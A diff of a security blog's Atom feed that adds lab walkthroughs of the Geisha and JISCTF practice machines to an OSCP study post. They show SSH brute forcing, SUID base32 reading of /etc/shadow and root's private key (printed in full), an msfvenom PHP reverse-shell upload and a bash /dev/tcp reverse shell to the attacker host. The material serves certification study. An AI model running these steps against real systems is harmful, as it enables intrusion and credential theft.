@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-02T22:11:10+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;Lately, I’ve been thinking a lot about some job interviews I had recently, especially one at a really good organization near to my aria. The interviews were interesting and kind of tough, and they got me thinking about my work and where I’m headed.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-03T12:27:18+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;Lately, I’ve been thinking a lot about some job interviews I had recently, especially one at a really good organization near to my aria. The interviews were interesting and kind of tough, and they got me thinking about my work and where I’m headed.&lt;/p&gt;
 
 &lt;p&gt;The first interview was on Zoom and was all about technical stuff. They asked me about Wireshark, which is a tool for analyzing network traffic, and about different protocols like TCP, LDAP, and SMB2. They also asked about things like Linux processes and sockets, which are like communication channels between computers. It was a good chat, and I felt like I could talk to them easily. They even explained what comes next in their hiring process.&lt;/p&gt;
 
@@ -254,9 +254,175 @@ uid=0(root) gid=0(root) groups=0(root),100(users),1001(baksteen)
 
 &lt;h3 id=&quot;geisha&quot;&gt;Geisha&lt;/h3&gt;
 
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Enumeration: run port scan against the target found several port open: 21,22,80,7125,7080,8088,9198, then run &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; and find, since we have 3 ports that used for web service this will be the first step to enumerate further.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Web Fuzzing: running webenum against port 7125 which is run as nginx found &lt;code class=&quot;highlighter-rouge&quot;&gt;passwd&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;shadow&lt;/code&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;200      GET       27l       39w     1432c http://192.168.218.82:7125/passwd
+403      GET        7l        9w      154c http://192.168.218.82:7125/shadow
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Download that &lt;code class=&quot;highlighter-rouge&quot;&gt;passwd&lt;/code&gt; file found that this is contains users, which mean that the web root directory on port 7125, most likely point out to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/&lt;/code&gt; directory that contain &lt;code class=&quot;highlighter-rouge&quot;&gt;passwd&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;shadow&lt;/code&gt; files, the user that look interesting is on the following line:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Brute Forcing: run tools like hydra or ssb (most faster):
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ ssb -w /usr/share/wordlists/rockyou.txt -t 30s geisha@192.168.218.82
+...
+[VLD] Connected with 'letmein'.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;This is mean we found the password: &lt;code class=&quot;highlighter-rouge&quot;&gt;geisha:letmein&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Initiation: run ssh with that password, we can successfully connected.
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ ssh geisha@192.168.218.82 -p 22         
+...
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+geisha@geisha:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;System Enumeration: since this is linux machine run several command to get know that place, found the following binary file with SUID:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;geisha@geisha:~$ ls -la $(echo $PATH|tr &quot;:&quot; &quot; &quot;) | grep rws
+-rwsr-sr-x  1 root root       43712 Feb 28  2019 base32
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Check &lt;code class=&quot;highlighter-rouge&quot;&gt;gtfobins&lt;/code&gt; found that with that base32 file we can read files, since that is SUID of root, it’s mean we can read shadow file.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;base32 /etc/shadow | base32 -d
+...
+root:$6$3haFwrdHJRZKWD./$LYiTApGClgwmFE3TXMRtekWpGOY6fSpnTorsQL/FBr9YdOW4NHMzYFkOLu8qJQVa1wqfEC3a.SZeTHIyEhlPF0:18446:0:99999:7:::
+geisha:$6$YtDFbbhHHf5Ag5ej$3EjLFKW1aSNBlfAhcyjmY97eLrNtbzDWQ9z5YvSvuA65kH7ZgHR1f9VGFhAEGGqiKAtF8//U45M8QOHouQrWb.:18494:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Then run &lt;code class=&quot;highlighter-rouge&quot;&gt;unshadow&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; for trying to crack that shadow file:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ unshadow passwd shadow &amp;gt; unshadowed.txt
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;found nothing but geisha password which is &lt;code class=&quot;highlighter-rouge&quot;&gt;letmein&lt;/code&gt;, so trying to grab keys from root directory:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;geisha@geisha:/$ base32 /root/.ssh/id_rsa.pub | base32 -d
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjd5XD/yhKyc5I8JLKFUSe3TV8jDLVhlSkQw9Dyk+TBfm4+Hg5leshNjcmphIIVyAlLfj9NCQounuIbZYaaeej86ngZyFcR1KSXCgY4o0DbaXulfnz0UAvVdIQEK3OWsKuSy99fTz7Lu1L8jyzjXDhoLVMN3mjxzUrHmV/CXurDRkyVt3nJ4BSG7G6/Gj8oWqJRR+lymgF/ehPYr3v9tmvTn1VTxPjB3kuQLMoQqYrl5tYgHp+Ah/HKESb+jd2XWWF6BO3MLo+2WG5Pu3L/+aoR4y6KnAfeWfrV8dezvYsj+9PHbpNJKbMejzNm37+XCuCuiHQHJdsK0NpmOjgcAV9
+geisha@geisha:/$ base32 /root/.ssh/id_rsa | base32 -d
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
+OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
+89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
+5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
+fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
+TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
+WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
+1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
+Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
+8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
+10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
+jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
+2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
+cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
+THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
+RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
+xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
+1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
+edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
+65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
+XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
+zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
+v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
+OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
+bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Privilege Escalation: since we have that id_rsa, we can use it to connect that target with ssh, just need to creat that file and change the mode for permissions:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ vim id_rsa
+└─$ chmod 600 ./id_rsa
+└─$ ssh -i id_rsa root@192.168.218.82
+...
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@geisha:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@geisha:~#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
 &lt;h3 id=&quot;jisctf&quot;&gt;JISCTF&lt;/h3&gt;
 
-&lt;h3 id=&quot;final-table-methodology&quot;&gt;Final table methodology&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;Enumeration: run port scan found that only ssh and web on port 80 are open, scan them both found that ssh is on version 7.2p2, but since port 80 is open trying to take that fiest, on nmap it found the following directories from http-robots.txt file:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| / /backup /admin /admin_area /r00t /uploads
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Checking on each found that curl admin_area give some page that contain comment about user and password:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ curl http://192.168.218.25/admin_area/
+&amp;lt;!--	username : admin
+ password : 3v1l_H@ck3r
+ Your flag is in another file...
+--&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Going to the web root directory, authenticate and found index.php, then we can upload files, so since this is php page based we can upload reverse shell based php, first create that file with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ msfvenom -p php/reverse_php lhost=192.168.45.203 lport=80 -f raw -o rs_x86_80.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 3002 bytes
+Saved as: rs_x86_80.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Initiation: then upload the file, on other terminal open nc for listen on port 80 and curl that file, after that we should have reverse shell that no so interactive:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ curl http://192.168.218.25/uploaded_files/rs_x86_80.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.218.25] 39942
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Interactive Shell: for make the shell more interactive run the following and open new terminal to get another shell sesion:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.45.203/80 0&amp;gt;&amp;amp;1'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.218.25] 39954
+bash: cannot set terminal process group (1241): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Jordaninfosec-CTF01:/var/www/html/uploaded_files$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Then running the following steps:&lt;/p&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl-Z&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stty -a | cut -d';' -f2-3 | head -n1&lt;/code&gt; should show the values of rows and columns.&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stty raw -echo;fg&lt;/code&gt; should bring the shell to front ground.&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stty rows 27 columns 120&lt;/code&gt; the values here are from the first stty command output.&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)&lt;/code&gt; spawn the shell in bash.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;System Enumeration: enumerate the target with &lt;code class=&quot;highlighter-rouge&quot;&gt;linpeas&lt;/code&gt; and also found under &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/&lt;/code&gt; directory that there is user named technawi, so run the following command:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -type f -user technawi -readable 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;found the following file which look interesting:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/etc/mysql/conf.d/credentials.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;that file contain the user and password for that technawi user:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username : technawi
+password : 3vilH@ksor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Privilege Escalation: run &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; with technawi work with that password, check what command that user can run with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; showed us that he can run all so run &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; and we have root.
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Jordaninfosec-CTF01:/home/technawi$ su technawi
+Password:
+technawi@Jordaninfosec-CTF01:~$ sudo -l
+Matching Defaults entries for technawi on Jordaninfosec-CTF01:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User technawi may run the following commands on Jordaninfosec-CTF01:
+(ALL : ALL) ALL
+technawi@Jordaninfosec-CTF01:~$ sudo su
+root@Jordaninfosec-CTF01:/home/technawi# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Jordaninfosec-CTF01:/home/technawi#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;final-table-methodology&quot;&gt;Final table methodology&lt;/h4&gt;
 
 &lt;p&gt;After finish them all, I came up with the following table.&lt;/p&gt;
 
